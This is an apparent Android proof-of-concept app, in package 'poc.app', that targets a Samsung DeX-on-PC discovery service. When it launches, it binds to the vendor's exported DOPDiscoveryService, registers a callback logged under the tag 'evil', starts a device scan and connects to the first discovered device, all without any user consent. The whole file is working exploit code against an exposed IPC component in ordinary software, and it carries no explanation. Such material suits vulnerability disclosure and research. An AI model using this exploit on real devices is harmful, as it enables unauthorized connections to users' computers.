package poc.app;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;

import com.sec.android.app.dexonpc.discovery.DeviceData;
import com.sec.android.app.dexonpc.discovery.IDiscoveryService;
import com.sec.android.app.dexonpc.discovery.IDiscoveryServiceCallback;

public class MainActivity extends Activity {
    private IDiscoveryService discoveryService;

    private ServiceConnection mServiceConnection = new ServiceConnection() {
        public void onServiceConnected(ComponentName cName, IBinder service) {
            discoveryService = IDiscoveryService.Stub.asInterface(service);
            processService();
        }

        public void onServiceDisconnected(ComponentName cName) {
        }
    };

    private IDiscoveryServiceCallback.Stub discoveryServiceCallback = new IDiscoveryServiceCallback.Stub() {
        @Override
        public void dismissCDD() {
            Log.d("evil", "dismissCDD");
        }

        @Override
        public void onConnectionStateChanged(DeviceData deviceData) {
            Log.d("evil", "onConnectionStateChanged");
        }

        @Override
        public void onDeviceAdded(DeviceData deviceData) throws RemoteException {
            Log.d("evil", "onDeviceAdded");
            // connect to the first discovered device
            discoveryService.connect(deviceData);
        }
    };

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent();
        i.setClassName("com.sec.android.app.dexonpc", "com.sec.android.app.dexonpc.discovery.DOPDiscoveryService");
        bindService(i, mServiceConnection, BIND_AUTO_CREATE);
    }

    private void processService() {
        try {
            discoveryService.registerCallback(discoveryServiceCallback);
            discoveryService.startScan();
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }
}